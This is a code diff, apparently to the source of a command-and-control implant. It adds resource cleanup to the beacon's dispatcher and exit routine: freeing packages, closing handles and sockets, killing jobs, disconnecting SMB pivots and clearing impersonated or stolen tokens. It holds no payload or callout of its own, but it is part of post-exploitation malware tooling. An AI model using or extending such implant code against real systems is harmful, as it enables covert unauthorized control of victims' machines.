@@ -62,7 +62,7 @@ VOID CommandDispatcher( VOID )
     do
     {
         if ( ! Instance.Session.Connected )
-            return;
+            break;
 
         SleepObf( Instance.Config.Sleeping * 1000 );
 
@@ -70,6 +70,7 @@ VOID CommandDispatcher( VOID )
         /* Send our buffer. */
         if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
         {
+            PackageDestroy( Package );
             CommandExit( NULL );
         }
 
@@ -77,6 +78,7 @@ VOID CommandDispatcher( VOID )
 #else
         if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) )
         {
+            PackageDestroy( Package );
             CommandExit( NULL );
         }
 #endif
@@ -146,6 +148,8 @@ VOID CommandDispatcher( VOID )
     } while ( TRUE );
 
     Instance.Session.Connected = FALSE;
+
+    PackageDestroy( Package );
 
     PUTS( "Out of while loop" )
 }
@@ -450,7 +454,8 @@ VOID CommandProc( PPARSER Parser )
                 if ( ProcessVerbose )
                     PackageAddInt32( Package, ProcessInfo.dwProcessId );
 
-                // Instance.Win32.NtClose( ProcessInfo.hThread );
+                Instance.Win32.NtClose( ProcessInfo.hProcess );
+                Instance.Win32.NtClose( ProcessInfo.hThread );
 
                 PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
             }
@@ -2789,15 +2794,23 @@ VOID CommandSocket( PPARSER Parser )
 // TODO: rewrite this. disconnect all pivots. kill our threads. release memory and free itself.
 VOID CommandExit( PPARSER Parser )
 {
-    PUTS( "Exit" )
+    PUTS( "Exit" );
 
     /* default is 1 == exit thread.
      * TODO: make an config that holds the default exit method */
-    UINT32   ExitMethod = 1;
-    PPACKAGE Package    = NULL;
-    CONTEXT  RopExit    = { 0 };
-    LPVOID   ImageBase  = NULL;
-    SIZE_T   ImageSize  = 0;
+    UINT32           ExitMethod    = 1;
+    PPACKAGE         Package       = NULL;
+    CONTEXT          RopExit       = { 0 };
+    LPVOID           ImageBase     = NULL;
+    SIZE_T           ImageSize     = 0;
+    PJOB_DATA        JobList       = Instance.Jobs;
+    DWORD            JobID         = 0;
+    PSOCKET_DATA     SocketList    = Instance.Sockets;
+    PSOCKET_DATA     SocketEntry   = NULL;
+    PDOWNLOAD_DATA   DownloadList  = Instance.Downloads;
+    PDOWNLOAD_DATA   DownloadEntry = NULL;
+    PPIVOT_DATA      SmbPivotList  = Instance.SmbPivots;
+    PPIVOT_DATA      SmbPivotEntry = NULL;
 
     if ( Parser )
     {
@@ -2810,7 +2823,75 @@ VOID CommandExit( PPARSER Parser )
         PackageTransmit( Package, NULL, NULL );
     }
 
-    // TODO: release every resource we allocated...
+    // kill all running jobs
+    for ( ;; )
+    {
+        if ( ! JobList )
+            break;
+
+        JobID = JobList->JobID;
+        JobList = JobList->Next;
+
+        JobKill( JobID );
+        JobRemove( JobID );
+    }
+
+    // close all sockets
+    for ( ;; )
+    {
+        if ( ! SocketList )
+            break;
+
+        SocketEntry = SocketList;
+        SocketList = SocketList->Next;
+
+        if ( SocketEntry->Socket )
+        {
+            Instance.Win32.closesocket( SocketEntry->Socket );
+            SocketEntry->Socket = NULL;
+        }
+
+        MemSet( SocketEntry, 0, sizeof( SOCKET_DATA ) );
+        NtHeapFree( SocketEntry );
+    }
+
+    // remove downloads
+    for ( ;; )
+    {
+        if ( ! DownloadList )
+            break;
+
+        DownloadEntry = DownloadList;
+        DownloadList = DownloadList->Next;
+
+        DownloadRemove( DownloadEntry->FileID );
+    }
+
+    // free the DownloadChunk buffer
+    if ( Instance.DownloadChunk.Buffer )
+    {
+        NtHeapFree( Instance.DownloadChunk.Buffer );
+        Instance.DownloadChunk.Buffer = NULL;
+        Instance.DownloadChunk.Length = 0;
+    }
+
+    // disconnect from all smb pivots
+    for ( ;; )
+    {
+        if ( ! SmbPivotList )
+            break;
+
+            SmbPivotEntry = SmbPivotList;
+            SmbPivotList = SmbPivotList->Next;
+
+            PivotRemove( SmbPivotEntry->DemonID );
+    }
+
+    // stop impersonating
+    TokenImpersonate( FALSE );
+
+    // clear all stolen tokens
+    TokenClear();
 
     /* NOTE:
      *      Credit goes to Austin (@ilove2pwn_) for sharing this code with me.
